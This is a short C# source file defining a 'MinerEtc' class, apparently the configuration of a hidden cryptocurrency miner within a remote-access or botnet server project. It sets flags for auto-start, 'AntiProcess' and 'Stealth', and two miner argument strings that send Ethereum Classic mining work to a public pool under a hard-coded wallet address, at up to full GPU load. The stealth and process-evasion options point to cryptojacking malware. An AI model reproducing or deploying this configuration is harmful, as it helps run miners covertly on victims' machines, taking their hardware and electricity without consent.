namespace Server.Data;

internal class MinerEtc
{
	public bool AutoStart;

	public bool AntiProcess;

	public bool Stealth;

	public string Args = "--cinit-find-e --pool=stratum://`0x525c4502B060eAc8ac9dcf412E3dC2d9dF74aEA0`.worker@etc.2miners.com:1010 --cinit-max-gpu=70 --response-timeout=300 --farm-retries=30 --cinit-etc";

	public string ArgsStealh = "--cinit-find-e --pool=stratum://`0x525c4502B060eAc8ac9dcf412E3dC2d9dF74aEA0`.worker@etc.2miners.com:1010 --cinit-max-gpu=100 --response-timeout=300 --farm-retries=30 --cinit-etc";
}
